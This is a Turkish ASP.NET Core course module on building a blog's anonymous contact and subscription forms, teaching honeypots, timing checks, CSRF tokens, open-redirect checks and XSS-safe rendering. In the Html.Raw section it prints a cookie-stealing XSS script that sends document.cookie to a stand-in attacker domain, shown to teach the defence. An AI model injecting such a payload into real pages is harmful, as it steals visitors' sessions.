# Modül 9 — İletişim Formu ve Abonelik

**Süre:** 1 ders saati

---

## 🎯 Bu derste ne yapacağız

**⭐ Projedeki iki anonim yazma noktası: iletişim formu ve abonelik.**

Şimdiye kadar veritabanına sadece **giriş yapmış** kişi yazdı. Şimdi kapıyı herkese açıyoruz — ve bu yeni riskler getiriyor: istenmeyen gönderim, XSS, açık yönlendirme, yarış koşulu.

---

## 📖 Anonim yazma neden farklı?

**Sınıfa sor:** *"Giriş yapmış kullanıcının yazdığı kayıtla, herhangi birinin yazdığı kayıt arasında ne fark var?"*

| | Giriş yapmış | Anonim |
|---|---|---|
| Kim yazdı belli mi? | ✅ Evet | ❌ Hayır |
| Kötüye kullanımda ne yapılır? | Hesap kapatılır | ⚠️ Yapılacak çok şey yok |
| Hacim kontrolü | Doğal (az kişi) | ⚠️ Botlar saniyede yüzlerce |
| Veri kalitesi | Genelde iyi | ⚠️ Spam, çöp |

### Alacağımız dört önlem

| Önlem | Neye karşı |
|---|---|
| **Sunucu tarafı doğrulama** | Eksik/hatalı veri |
| **Bal küpü (honeypot)** | Basit botlar |
| **Zaman kontrolü** | Hızlı bot gönderimi |
| **Uzunluk sınırı** | Veritabanı şişirme |

> ⚠️ Bunların hiçbiri **tam koruma** değildir. Kararlı bir saldırgan hepsini aşar. Amaç, otomatik spam trafiğinin büyük kısmını elemek.
>
> Gerçek projede ek olarak: reCAPTCHA / hCaptcha, IP başına hız sınırı (rate limiting), e-posta doğrulama.

---

## 📖 Bal küpü (honeypot) nedir?

Formda **gizli** bir alan. İnsan göremez, doldurmaz. Bot ise formdaki tüm alanları doldurur.

```html
<!-- Ekranda görünmez -->
<div style="position:absolute; left:-9999px;" aria-hidden="true">
    <label for="website">Web siteniz</label>
    <input type="text" id="website" name="Website" tabindex="-1" autocomplete="off" />
</div>
```

Sunucuda:

```csharp
if (!string.IsNullOrEmpty(model.Website))
{
    // Bot. Sessizce "başarılı" de ama KAYDETME.
    return View("Tesekkur");
}
```

### ⚠️ Üç detaya dikkat

**1. `display: none` KULLANMAYIN.** Gelişmiş botlar CSS'i okur ve gizli alanları atlar. `position: absolute; left: -9999px` daha az belli eder.

**2. `tabindex="-1"` şart.** Klavyeyle gezen kullanıcı Tab'a basınca bu alana düşmemeli.

**3. `aria-hidden="true"` şart.** Ekran okuyucu bu alanı okumamalı — yoksa görme engelli kullanıcı "Web siteniz" alanını doldurur ve mesajı gitmez.

> **Sınıfa sor:** *"`aria-hidden` olmasaydı kim mağdur olurdu?"*
> Ekran okuyucu kullanan biri. Bal küpü, erişilebilirliği bozmadan kurulmalı — yoksa bot yerine gerçek kullanıcıyı engellersiniz.

### Zaman kontrolü

Form açıldığı an bir zaman damgası konur. Gönderim 3 saniyeden hızlıysa şüphelidir.

```
İnsan: formu okur, yazar, gönderir → en az 10-15 saniye
Bot:   sayfayı alır, POST eder     → 1 saniyeden az
```

---

## ⌨️ Adım 1: ViewModel

`Models/Mesaj.cs` dosyasının sonuna ekleyin:

```csharp
/// <summary>
/// İletişim formunun taşıyıcısı.
///
/// ⭐ Neden Mesaj sınıfını doğrudan kullanmıyoruz?
///    Mesaj'da OkunduMu, AktifMi, CreatedDate var.
///    Forma koysaydık kötü niyetli biri F12 ile
///    OkunduMu=true gönderip mesajını gizleyebilirdi.
///
///    KURAL: Kullanıcıdan gelen modele SADECE gereken alanları koy.
/// </summary>
public class IletisimViewModel
{
    [Required(ErrorMessage = "Adınızı yazın.")]
    [StringLength(100, MinimumLength = 2, ErrorMessage = "Ad 2-100 karakter olmalı.")]
    [Display(Name = "Adınız")]
    public string Ad { get; set; } = "";

    [Required(ErrorMessage = "E-posta adresinizi yazın.")]
    [EmailAddress(ErrorMessage = "Geçerli bir e-posta adresi girin.")]
    [StringLength(255)]
    [Display(Name = "E-posta")]
    public string Eposta { get; set; } = "";

    [Required(ErrorMessage = "Konu yazın.")]
    [StringLength(150, MinimumLength = 3, ErrorMessage = "Konu 3-150 karakter olmalı.")]
    [Display(Name = "Konu")]
    public string Konu { get; set; } = "";

    [Required(ErrorMessage = "Mesajınızı yazın.")]
    [StringLength(2000, MinimumLength = 10,
        ErrorMessage = "Mesaj 10-2000 karakter arasında olmalı.")]
    [Display(Name = "Mesajınız")]
    public string Icerik { get; set; } = "";

    // ══════════════════════════════════════════════════════
    //  ⭐ BAL KÜPÜ
    //  Gerçek kullanıcı bu alanı göremez ve doldurmaz.
    //  Doluysa gönderen bir bottur.
    //
    //  Adı bilerek masum: "Website". Botlar alan adlarına
    //  bakarak doldurur; "honeypot" yazsaydık anlarlardı.
    // ══════════════════════════════════════════════════════
    public string? Website { get; set; }

    /// <summary>
    /// Form sayfasının açıldığı an (Unix saniye).
    /// Çok hızlı gönderim bot işaretidir.
    /// </summary>
    public long AcilisZamani { get; set; }
}
```

---

## ⌨️ Adım 2: Controller

`Controllers/IletisimController.cs`:

```csharp
using Microsoft.AspNetCore.Mvc;
using KisiselBlog.Data;
using KisiselBlog.Models;

namespace KisiselBlog.Controllers;

[Route("iletisim")]
public class IletisimController : GenelController
{
    private readonly BlogDbContext _db;
    private readonly ILogger<IletisimController> _gunluk;

    // İnsanın formu doldurması en az bu kadar sürer
    private const int EnAzSaniye = 3;

    public IletisimController(BlogDbContext db, ILogger<IletisimController> gunluk)
    {
        _db = db;
        _gunluk = gunluk;
    }

    // ══════════════════════════════════════════════════════
    //  FORM
    //  GET: /iletisim
    // ══════════════════════════════════════════════════════
    [HttpGet("")]
    public IActionResult Index()
    {
        ViewData["Title"] = "İletişim";

        return View(new IletisimViewModel
        {
            // ⭐ Form açılış zamanını damgala
            AcilisZamani = DateTimeOffset.UtcNow.ToUnixTimeSeconds()
        });
    }

    // ══════════════════════════════════════════════════════
    //  GÖNDER
    //  POST: /iletisim
    // ══════════════════════════════════════════════════════
    [HttpPost("")]
    [ValidateAntiForgeryToken]
    public async Task<IActionResult> Index(IletisimViewModel model)
    {
        ViewData["Title"] = "İletişim";

        // ── 1) BAL KÜPÜ ─────────────────────────────────────
        //
        // ⭐ Bota hata GÖSTERME. "Başarılı" de ve kaydetme.
        //    Hata gösterseydik bot neyin yanlış olduğunu öğrenir
        //    ve bir dahakine o alanı boş bırakırdı.
        if (!string.IsNullOrEmpty(model.Website))
        {
            _gunluk.LogWarning("Bal küpü doldu — bot şüphesi. IP: {ip}",
                HttpContext.Connection.RemoteIpAddress);

            return View("Tesekkur");       // sahte başarı
        }

        // ── 2) ZAMAN KONTROLÜ ───────────────────────────────
        long simdi = DateTimeOffset.UtcNow.ToUnixTimeSeconds();
        long gecenSure = simdi - model.AcilisZamani;

        if (model.AcilisZamani > 0 && gecenSure < EnAzSaniye)
        {
            _gunluk.LogWarning("Çok hızlı gönderim ({sn} sn) — bot şüphesi.", gecenSure);
            return View("Tesekkur");       // sahte başarı
        }

        // ── 3) NORMAL DOĞRULAMA ─────────────────────────────
        if (!ModelState.IsValid)
        {
            // ⚠️ Açılış zamanını yenile — kullanıcı formu düzeltirken
            //    eski damga kalırsa sorun olmaz ama yeni damga daha doğru.
            model.AcilisZamani = simdi;
            return View(model);
        }

        // ── 4) KAYDET ───────────────────────────────────────
        //
        // ⭐ ViewModel'den Mesaj'a ELLE kopyalıyoruz.
        //    Sistem alanlarını (OkunduMu, AktifMi, CreatedDate)
        //    biz dolduruyoruz — kullanıcıdan almıyoruz.
        var mesaj = new Mesaj
        {
            Ad          = model.Ad.Trim(),
            Eposta      = model.Eposta.Trim(),
            Konu        = model.Konu.Trim(),
            Icerik      = model.Icerik.Trim(),
            OkunduMu    = false,
            CreatedDate = DateTime.Now,
            AktifMi     = true
        };

        _db.Mesajlar.Add(mesaj);
        await _db.SaveChangesAsync();

        // POST-Redirect-GET değil, doğrudan görünüm:
        // kullanıcı F5'e basarsa tarayıcı uyarır, çift kayıt olmaz.
        // (Yönlendirme de yapılabilirdi; ikisi de doğru.)
        return View("Tesekkur");
    }
}
```

### ⚠️ Neden bota hata göstermiyoruz?

```csharp
if (!string.IsNullOrEmpty(model.Website))
    return View("Tesekkur");       // "başarılı" — ama kaydetmedik
```

**Sor:** *"Bota 'sen botsun' desek ne olurdu?"*

Bot yazarı logları okur, hangi alanın kendisini ele verdiğini anlar ve bir dahaki sefer boş bırakır. **Sessiz başarısızlık** daha etkilidir.

Bu, güvenlikte sık kullanılan bir ilke: **saldırgana geri bildirim verme.** Giriş ekranındaki "kullanıcı adı veya şifre hatalı" mesajı da aynı mantıktı.

---

## ⌨️ Adım 3: Form görünümü

`Views/Iletisim/Index.cshtml`:

```html
@model KisiselBlog.Models.IletisimViewModel
@{
    ViewData["Title"] = "İletişim";
}

<h1>İletişim</h1>

<p class="yazi-govde" style="margin-top: 1rem; margin-bottom: 4rem;
                        color: var(--soluk);">
    Bir sorunuz, öneriniz veya sadece merhaba demek mi istiyorsunuz?
    Formu doldurun, elimden geldiğince çabuk dönerim.
</p>

<form method="post" style="max-width: 32rem;">

    @* Açılış zamanı — bot kontrolü için *@
    <input type="hidden" asp-for="AcilisZamani" />

    @* ═══ ⭐ BAL KÜPÜ ═══
       Üç koruma birden:
         position/left  → ekranda görünmez (display:none DEĞİL)
         tabindex="-1"  → Tab ile gelinmez
         aria-hidden    → ekran okuyucu okumaz
       Botlar bu alanı doldurur, insanlar dolduramaz. *@
    <div style="position:absolute; left:-9999px; top:-9999px;"
         aria-hidden="true">
        <label for="Website">Web siteniz (bu alanı boş bırakın)</label>
        <input type="text" id="Website" name="Website"
               tabindex="-1" autocomplete="off" />
    </div>

    @if (!ViewData.ModelState.IsValid)
    {
        <div class="alert alert-danger" style="margin-bottom: 1.5rem;">
            Lütfen aşağıdaki alanları kontrol edin.
        </div>
    }

    <div class="mb-3">
        <label asp-for="Ad" class="form-label"></label>
        <input asp-for="Ad" autocomplete="name" class="form-control" />
        <span asp-validation-for="Ad" class="text-danger small"></span>
    </div>

    <div class="mb-3">
        <label asp-for="Eposta" class="form-label"></label>
        <input asp-for="Eposta" type="email" autocomplete="email" class="form-control" />
        <span asp-validation-for="Eposta" class="text-danger small"></span>
        <div class="form-text">Size dönebilmem için gerekli. Kimseyle paylaşılmaz.</div>
    </div>

    <div class="mb-3">
        <label asp-for="Konu" class="form-label"></label>
        <input asp-for="Konu" class="form-control" />
        <span asp-validation-for="Konu" class="text-danger small"></span>
    </div>

    <div class="mb-3">
        <label asp-for="Icerik" class="form-label"></label>
        <textarea asp-for="Icerik" rows="8" id="mesajAlani" class="form-control"></textarea>
        <span asp-validation-for="Icerik" class="text-danger small"></span>
        <div class="form-text" style="display:flex; justify-content:space-between;">
            <span>En az 10, en fazla 2000 karakter.</span>
            <span id="karakterSayac"></span>
        </div>
    </div>

    <button type="submit" class="btn btn-primary">Gönder</button>

</form>

@section Scripts {
    <partial name="_ValidationScriptsPartial" />

    <script>
        // Karakter sayacı
        (function () {
            var alan  = document.getElementById('mesajAlani');
            var sayac = document.getElementById('karakterSayac');
            if (!alan || !sayac) return;

            function guncelle() {
                var n = alan.value.length;
                sayac.textContent = n + ' / 2000';
                sayac.style.color = (n > 2000 || (n > 0 && n < 10))
                    ? 'var(--bs-danger)'
                    : 'var(--soluk)';
            }

            alan.addEventListener('input', guncelle);
            guncelle();
        })();
    </script>
}
```

> **Dikkat:** Bu sayfa genel site layout'unu kullanıyor ve orada `site.css` yüklü.
> Form alanları için ekstra CSS yazmamıza gerek yok — `form-control`, `form-label`,
> `form-text` ve `alert` sınıfları Bootstrap'ten geliyor ve her iki layout'ta da çalışıyor.
> Panelde ve genel sitede **aynı** form sınıfları kullanılıyor; tek fark yazı tipi.

---

## ⌨️ Adım 4: Teşekkür sayfası

`Views/Iletisim/Tesekkur.cshtml`:

```html
@{
    ViewData["Title"] = "Mesajınız alındı";
}

<div style="text-align:center; padding: 6rem 0;">

    <div style="font-size: 2.5625rem; color: var(--bs-success);">✓</div>

    <h1 style="margin-top: 1rem;">Mesajınız alındı</h1>

    <p class="yazi-govde" style="color: var(--soluk);
                            margin: 1rem auto 0;
                            max-width: 28rem;">
        Teşekkürler. En kısa sürede dönüş yapacağım.
    </p>

    <p style="margin-top: 3rem;">
        <a asp-controller="Anasayfa" asp-action="Index" class="btn btn-primary">
            Yazılara dön
        </a>
    </p>

</div>
```

---

## ⌨️ Adım 5: Abonelik formu — ikinci anonim yazma noktası

Yan sütundaki "ABONE OL" formu Modül 3'ten beri bir yere gitmiyordu. Şimdi dolduruyoruz.

İletişim formuyla aynı sınıfa giriyor: **giriş yapmamış biri veritabanına yazıyor.** Ama iki farkı var ve ikisi de öğretici.

| | İletişim formu | Abonelik formu |
|---|---|---|
| Nerede | Kendi sayfasında | **Her sayfada** (yan sütun) |
| Alan sayısı | 4 | 1 |
| Tekrar | Aynı kişi 10 mesaj atabilir | Aynı e-posta **bir kere** |
| Hata gösterimi | Form sayfasında | Geldiği sayfada |

### 5.1 Controller

`Controllers/AbonelikController.cs`:

```csharp
using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using KisiselBlog.Data;
using KisiselBlog.Models;
using System.ComponentModel.DataAnnotations;

namespace KisiselBlog.Controllers;

public class AbonelikController : GenelController
{
    private readonly BlogDbContext _db;

    public AbonelikController(BlogDbContext db)
    {
        _db = db;
    }

    // POST: /abonelik/kaydol
    [HttpPost]
    [ValidateAntiForgeryToken]
    public async Task<IActionResult> Kaydol(string? eposta)
    {
        // ── 1) Biçim kontrolü ──
        //
        // ⚠️ ViewModel kullanmıyoruz çünkü tek alan var.
        //    Ama doğrulamayı atlamıyoruz — elle yapıyoruz.
        if (string.IsNullOrWhiteSpace(eposta) ||
            !new EmailAddressAttribute().IsValid(eposta))
        {
            TempData["AboneSonuc"] = "Geçerli bir e-posta adresi girin.";
            return GeriDon();
        }

        // ⭐ Normalleştirme: boşlukları at, küçük harfe çevir.
        //    "  Ali@Site.COM " ile "ali@site.com" aynı kişi.
        //
        //    ⚠️ ToLowerInvariant — ToLower() DEĞİL.
        //    Türkçe kültürde "ALI@x.com".ToLower() → "alı@x.com"
        //    olurdu ve adres bozulurdu. Modül 2'deki slug tuzağının
        //    aynısı, bu sefer e-postada.
        string temiz = eposta.Trim().ToLowerInvariant();

        if (temiz.Length > 255)
        {
            TempData["AboneSonuc"] = "E-posta adresi çok uzun.";
            return GeriDon();
        }

        // ── 2) Zaten kayıtlı mı? ──
        //
        // ⚠️ Pasife alınmışları da arıyoruz (IgnoreQueryFilters).
        //    Yoksa daha önce abonelikten çıkmış biri tekrar
        //    kaydolmak istediğinde veritabanı kısıtına takılır
        //    ve kullanıcı anlamsız bir hata görür.
        var mevcut = await _db.Aboneler
            .IgnoreQueryFilters()
            .FirstOrDefaultAsync(a => a.Eposta == temiz);

        if (mevcut != null)
        {
            if (!mevcut.AktifMi)
            {
                // Geri dönen abone — kaydı yeniden etkinleştir
                mevcut.AktifMi = true;
                mevcut.CreatedDate = DateTime.Now;
                await _db.SaveChangesAsync();
            }

            // ⭐ Zaten kayıtlı olana da AYNI mesajı veriyoruz.
            //    Farklı mesaj verseydik, bir saldırgan formu
            //    deneyerek "bu adres abone mi?" sorusunu
            //    cevaplayabilirdi. Modül 4'teki kullanıcı
            //    sayımı (user enumeration) probleminin aynısı.
            TempData["AboneSonuc"] = "Teşekkürler! Kaydınız alındı.";
            return GeriDon();
        }

        // ── 3) Kaydet ──
        try
        {
            _db.Aboneler.Add(new Abone { Eposta = temiz });
            await _db.SaveChangesAsync();
            TempData["AboneSonuc"] = "Teşekkürler! Kaydınız alındı.";
        }
        catch (DbUpdateException)
        {
            // ⭐ Yarış koşulu: iki kişi aynı anda aynı adresi
            //    gönderdi, ikisinin de kontrolü "yok" dedi.
            //    Veritabanındaki benzersiz indeks ikincisini
            //    reddetti. Kullanıcı açısından sonuç aynı.
            TempData["AboneSonuc"] = "Teşekkürler! Kaydınız alındı.";
        }

        return GeriDon();
    }

    /// <summary>
    /// Formun gönderildiği sayfaya geri döner.
    /// Yan sütun her sayfada olduğu için sabit bir adrese
    /// dönemeyiz — kullanıcıyı okuduğu yazıdan koparırdık.
    /// </summary>
    private IActionResult GeriDon()
    {
        string? geldigiYer = Request.Headers.Referer.ToString();

        // ⚠️ Referer başlığı kullanıcıdan gelir, yani GÜVENİLMEZ.
        //    Url.IsLocalUrl olmadan açık yönlendirme (open redirect)
        //    açığı olurdu: saldırgan sahte bir Referer ile
        //    ziyaretçiyi kendi sitesine yollayabilirdi.
        //    Modül 4'te giriş dönüşünde aynı kontrolü yapmıştık.
        if (!string.IsNullOrEmpty(geldigiYer) && Url.IsLocalUrl(geldigiYer))
            return Redirect(geldigiYer);

        return RedirectToAction("Index", "Anasayfa");
    }
}
```

### 5.2 Yan sütun formu

`_YanSutun.cshtml`'deki abonelik formu `[ValidateAntiForgeryToken]` ile korunuyor; bunun çalışması için forma token eklenmeli. Tag Helper bunu `asp-controller` kullanılan `<form>` etiketlerine **otomatik** ekler, ama kontrol edin:

```html
<form class="d-flex" method="post" asp-controller="Abonelik" asp-action="Kaydol">
    <input type="email" name="eposta" required
           class="form-control form-control-sm rounded-0"
           placeholder="eposta@@ornek.com" aria-label="E-posta adresiniz" />
    <button type="submit" class="btn btn-sari btn-sm rounded-0 px-3">Kaydol</button>
</form>

@if (TempData["AboneSonuc"] != null)
{
    <p class="small mb-0 mt-2" style="color: var(--soluk);">@TempData["AboneSonuc"]</p>
}
```

**Derste gösterin:** Sayfa kaynağını açın, formun içinde `<input name="__RequestVerificationToken" type="hidden">` olduğunu bulun. Tag Helper'ın sessizce eklediği bu alan, CSRF saldırılarına karşı koruyor. `asp-action` yerine düz `action="/abonelik/kaydol"` yazsaydınız **eklenmezdi** ve her gönderim 400 hatası alırdı.

### ⚠️ Gerçekte eksik olan

Bu abonelik sistemi **ders düzeyinde**. Gerçek bir bültende şunlar da olmalı:

| Eksik | Neden gerekli |
|---|---|
| **Çift onay** (double opt-in) | Birisi başkasının adresini yazabilir. Onay e-postası olmadan istenmeyen posta göndermiş olursunuz. |
| **Abonelikten çık bağlantısı** | Her e-postanın altında olmalı. Çoğu ülkede yasal zorunluluk (AB'de GDPR, ABD'de CAN-SPAM). |
| **Hız sınırı** | Aynı IP'den dakikada 100 kayıt denemesi engellenmeli. |
| **Bal küpü** | İletişim formundaki gibi. Alıştırma 5'te ekleyeceksiniz. |

> **Sor:** *"Tek satırlık bir form için dört eksik saydık. Peki bu formu hiç yazmasak mı?"*
> Hayır — ama gerçek projede bu işi Mailchimp, Buttondown gibi bir servise bırakmak yaygın. Onlar çift onayı, abonelikten çıkmayı ve yasal uyumu zaten çözmüş durumda. Kendiniz yazdığınızda bunların hepsi **sizin** sorumluluğunuz olur.

---


## ⌨️ Adım 6: Mesaj yönetimi

`Controllers/MesajYonetimController.cs`:

```csharp
using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using KisiselBlog.Data;

namespace KisiselBlog.Controllers;

[Route("yonetim/mesaj")]
public class MesajYonetimController : YonetimControllerTabani
{
    private readonly BlogDbContext _db;

    public MesajYonetimController(BlogDbContext db)
    {
        _db = db;
    }

    // ══════════════════════════════════════════════════════
    //  LİSTE
    // ══════════════════════════════════════════════════════
    [HttpGet("")]
    public async Task<IActionResult> Index(bool sadeceOkunmamis = false)
    {
        ViewData["Title"] = "Mesajlar";

        IQueryable<Models.Mesaj> sorgu = _db.Mesajlar.AsNoTracking();

        if (sadeceOkunmamis)
            sorgu = sorgu.Where(m => !m.OkunduMu);

        var mesajlar = await sorgu
            // ⭐ Okunmamışlar üstte
            .OrderBy(m => m.OkunduMu)
            .ThenByDescending(m => m.CreatedDate)
            .ToListAsync();

        ViewBag.SadeceOkunmamis = sadeceOkunmamis;
        ViewBag.OkunmamisSayi = await _db.Mesajlar.CountAsync(m => !m.OkunduMu);

        return View(mesajlar);
    }

    // ══════════════════════════════════════════════════════
    //  DETAY  — açınca okundu say
    // ══════════════════════════════════════════════════════
    [HttpGet("{id:long}")]
    public async Task<IActionResult> Detay(long id)
    {
        var mesaj = await _db.Mesajlar.FindAsync(id);

        if (mesaj == null)
            return NotFound();

        // ⭐ Açıldıysa okunmuş say
        if (!mesaj.OkunduMu)
        {
            mesaj.OkunduMu = true;
            await _db.SaveChangesAsync();
        }

        ViewData["Title"] = mesaj.Konu;
        return View(mesaj);
    }

    // ══════════════════════════════════════════════════════
    //  OKUNMADI İŞARETLE
    // ══════════════════════════════════════════════════════
    [HttpPost("okunmadi/{id:long}")]
    [ValidateAntiForgeryToken]
    public async Task<IActionResult> Okunmadi(long id)
    {
        await _db.Mesajlar
            .Where(m => m.MesajId == id)
            .ExecuteUpdateAsync(s => s.SetProperty(m => m.OkunduMu, false));

        TempData["Basarili"] = "Mesaj okunmadı olarak işaretlendi.";
        return RedirectToAction(nameof(Index));
    }

    // ══════════════════════════════════════════════════════
    //  SİL
    // ══════════════════════════════════════════════════════
    [HttpPost("sil/{id:long}")]
    [ValidateAntiForgeryToken]
    public async Task<IActionResult> Sil(long id)
    {
        var mesaj = await _db.Mesajlar.FindAsync(id);

        if (mesaj == null)
            return NotFound();

        mesaj.AktifMi = false;
        await _db.SaveChangesAsync();

        TempData["Basarili"] = "Mesaj silindi.";
        return RedirectToAction(nameof(Index));
    }

    // ══════════════════════════════════════════════════════
    //  TÜMÜNÜ OKUNDU YAP
    // ══════════════════════════════════════════════════════
    [HttpPost("tumunu-okundu")]
    [ValidateAntiForgeryToken]
    public async Task<IActionResult> TumunuOkundu()
    {
        // ⭐ ExecuteUpdate: tek sorguda hepsini güncelle.
        //    Klasik yolla 50 mesaj = 1 SELECT + 50 UPDATE olurdu.
        int adet = await _db.Mesajlar
            .Where(m => !m.OkunduMu)
            .ExecuteUpdateAsync(s => s.SetProperty(m => m.OkunduMu, true));

        TempData["Basarili"] = $"{adet} mesaj okundu olarak işaretlendi.";
        return RedirectToAction(nameof(Index));
    }
}
```

---

## ⌨️ Adım 7: Mesaj görünümleri

`Views/Yonetim/MesajYonetim/Index.cshtml`:

```html
@model List<KisiselBlog.Models.Mesaj>
@{
    ViewData["Title"] = "Mesajlar";
    bool sadeceOkunmamis = ViewBag.SadeceOkunmamis;
    int okunmamisSayi = ViewBag.OkunmamisSayi;
}

@section BaslikEylem {
    <div style="display:flex; gap: .5rem;">
        @if (sadeceOkunmamis)
        {
            <a asp-action="Index" class="btn btn-outline-secondary">Tümünü göster</a>
        }
        else if (okunmamisSayi > 0)
        {
            <a asp-action="Index" asp-route-sadeceOkunmamis="true"
               class="btn btn-outline-secondary">Okunmamışlar (@okunmamisSayi)</a>
        }

        @if (okunmamisSayi > 0)
        {
            <form asp-action="TumunuOkundu" method="post" style="display:inline;">
                <button type="submit" class="btn btn-outline-secondary">Tümünü okundu yap</button>
            </form>
        }
    </div>
}

@if (!Model.Any())
{
    <div class="text-center py-5 text-secondary">
        <p>@(sadeceOkunmamis ? "Okunmamış mesaj yok." : "Henüz mesaj yok.")</p>
    </div>
}
else
{
    <div class="table-responsive">
    <table class="table table-hover align-middle">
        <thead>
            <tr>
                <th style="width: 3rem;"></th>
                <th>Gönderen</th>
                <th>Konu</th>
                <th style="width: 10rem;">Tarih</th>
                <th class="text-end" style="width: 10rem;">İşlem</th>
            </tr>
        </thead>
        <tbody>
            @foreach (var m in Model)
            {
                <tr class="@(m.OkunduMu ? "" : "table-warning")">

                    <td class="text-center">
                        @if (!m.OkunduMu)
                        {
                            <span class="d-inline-block rounded-circle bg-primary"
                                  title="Okunmadı"
                                  style="width:8px; height:8px;"></span>
                        }
                    </td>

                    <td>
                        <a asp-action="Detay" asp-route-id="@m.MesajId"
                           class="@(m.OkunduMu ? "" : "fw-semibold")">
                            @m.Ad
                        </a>
                        <div class="small text-secondary">@m.Eposta</div>
                    </td>

                    <td>
                        <a asp-action="Detay" asp-route-id="@m.MesajId">@m.Konu</a>
                        <div class="small text-secondary text-truncate"
                             style="max-width: 24rem;">
                            @m.Icerik
                        </div>
                    </td>

                    <td class="text-nowrap text-secondary">
                        @m.CreatedDate.ToString("d MMM yyyy")
                        <div style="font-size: .8125rem;">
                            @m.CreatedDate.ToString("HH:mm")
                        </div>
                    </td>

                    <td class="text-end text-nowrap">
                        <a href="mailto:@m.Eposta?subject=RE: @m.Konu"
                           class="btn btn-outline-secondary btn-sm">Yanıtla</a>

                        <form asp-action="Sil" asp-route-id="@m.MesajId"
                              method="post" style="display:inline;"
                              onsubmit="return confirm('Bu mesaj silinecek. Emin misiniz?');">
                            <button type="submit" class="btn btn-outline-danger btn-sm">
                                Sil
                            </button>
                        </form>
                    </td>
                </tr>
            }
        </tbody>
    </table>
    </div>
}
```

`Views/Yonetim/MesajYonetim/Detay.cshtml`:

```html
@model KisiselBlog.Models.Mesaj
@{
    ViewData["Title"] = Model.Konu;
}

<div style="max-width: 44rem;">

    <div class="card">

        @* ⭐ card-header: Bootstrap'in kart başlığı — gri zemin ve alt çizgi hazır *@
        <div class="card-header">
            <div class="fw-semibold">@Model.Ad</div>
            <div class="small">
                <a href="mailto:@Model.Eposta">@Model.Eposta</a>
            </div>
            <div class="small text-secondary mt-1">
                @Model.CreatedDate.ToString("d MMMM yyyy, HH:mm")
            </div>
        </div>

        <div class="card-body">
            @* ⚠️ Html.Raw YOK — bu metin KULLANICIDAN geliyor.
                 Razor varsayılan olarak kaçırıyor, öyle kalsın.
                 white-space: pre-wrap satır sonlarını koruyor. *@
            <div style="white-space: pre-wrap; line-height: 1.75;">@Model.Icerik</div>
        </div>

    </div>

    <div class="d-flex flex-wrap gap-2 mt-4">

        <a href="mailto:@Model.Eposta?subject=RE: @Model.Konu"
           class="btn btn-primary">E-posta ile yanıtla</a>

        <form asp-action="Okunmadi" asp-route-id="@Model.MesajId" method="post">
            <button type="submit" class="btn btn-outline-secondary">Okunmadı işaretle</button>
        </form>

        <form asp-action="Sil" asp-route-id="@Model.MesajId" method="post"
              onsubmit="return confirm('Bu mesaj silinecek. Emin misiniz?');">
            <button type="submit" class="btn btn-outline-danger">Sil</button>
        </form>

        <a asp-action="Index" class="btn btn-outline-secondary">Listeye dön</a>
    </div>

</div>
```

### ⚠️ Mesaj içeriğinde `Html.Raw` YOK

Bu, modülün en önemli güvenlik noktası.

```html
@* ✅ DOĞRU *@
<div style="white-space: pre-wrap;">@Model.Icerik</div>

@* ❌ FELAKET *@
<div>@Html.Raw(Model.Icerik)</div>
```

**Sor:** *"Yazı içeriğinde `Html.Raw` kullandık. Burada neden kullanmıyoruz?"*

| | Yazı içeriği | Mesaj içeriği |
|---|---|---|
| Kim yazdı? | Site sahibi | **Herhangi biri** |
| Markdig'den geçti mi? | ✅ `.DisableHtml()` ile | ❌ Ham metin |
| Güvenilir mi? | Evet | **Hayır** |

Birisi mesaj kutusuna şunu yazabilir:

```html
<script>
fetch('https://saldirgan.com/calan?cerez=' + document.cookie)
</script>
```

`Html.Raw` kullansaydınız, mesajı okuduğunuz anda **oturum çerezi saldırgana giderdi.**

> `Cookie.HttpOnly = true` ayarı (Modül 4) bu özel saldırıyı engeller — JavaScript çereze erişemez. Ama XSS'in tek zararı çerez çalmak değil: sayfa içeriği değiştirilebilir, form gönderilebilir, yönlendirme yapılabilir.
>
> **Katmanlı savunma:** Hem `HttpOnly` hem `Html.Raw` kullanmamak.

---

## ⌨️ Adım 8: Panelde abone listesi

`Controllers/MesajYonetimController.cs`'e (Adım 6'da yazdığımız dosya) ekleyin:

```csharp
// GET: /yonetim/mesaj/aboneler
[HttpGet("aboneler")]
public async Task<IActionResult> Aboneler()
{
    ViewData["Title"] = "Aboneler";

    var liste = await _db.Aboneler
        .AsNoTracking()
        .OrderByDescending(a => a.CreatedDate)
        .ToListAsync();

    return View(liste);
}

// POST: /yonetim/mesaj/abone-cikar/5
[HttpPost("abone-cikar/{id:long}")]
[ValidateAntiForgeryToken]
public async Task<IActionResult> AboneCikar(long id)
{
    // Soft delete — kayıt duruyor, AktifMi false oluyor.
    // Böylece aynı kişi tekrar kaydolursa geçmişi kaybolmuyor.
    var abone = await _db.Aboneler.FindAsync(id);
    if (abone == null) return NotFound();

    abone.AktifMi = false;
    await _db.SaveChangesAsync();

    TempData["Basarili"] = $"{abone.Eposta} listeden çıkarıldı.";
    return RedirectToAction(nameof(Aboneler));
}
```

`Views/Yonetim/MesajYonetim/Aboneler.cshtml`:

```html
@model List<KisiselBlog.Models.Abone>
@{
    ViewData["Title"] = "Aboneler";
}

@section BaslikEylem {
    <a asp-action="Index" class="btn btn-outline-secondary">Mesajlara dön</a>
}

@if (!Model.Any())
{
    <div class="card">
        <div class="card-body text-secondary">Henüz abone yok.</div>
    </div>
}
else
{
    <p class="text-secondary small">@Model.Count abone</p>

    <div class="card">
        <div class="table-responsive">
            <table class="table table-hover align-middle mb-0">
                <thead>
                    <tr>
                        <th>E-posta</th>
                        <th style="width: 12rem;">Kayıt tarihi</th>
                        <th style="width: 8rem;"></th>
                    </tr>
                </thead>
                <tbody>
                    @foreach (var a in Model)
                    {
                        <tr>
                            <td>@a.Eposta</td>
                            <td class="text-nowrap text-secondary">
                                @a.CreatedDate.ToString("d MMM yyyy HH:mm")
                            </td>
                            <td class="text-end">
                                <form asp-action="AboneCikar" asp-route-id="@a.AboneId"
                                      method="post" class="d-inline"
                                      onsubmit="return confirm('@a.Eposta listeden çıkarılsın mı?');">
                                    <button type="submit" class="btn btn-outline-danger btn-sm">
                                        Çıkar
                                    </button>
                                </form>
                            </td>
                        </tr>
                    }
                </tbody>
            </table>
        </div>
    </div>
}
```

Panel navbar'ındaki "Mesajlar" bağlantısının yanına ekleyin (`_YonetimLayout.cshtml`):

```html
<li class="nav-item">
    <a class="nav-link @Aktif("abone")"
       asp-controller="MesajYonetim" asp-action="Aboneler">Aboneler</a>
</li>
```

---

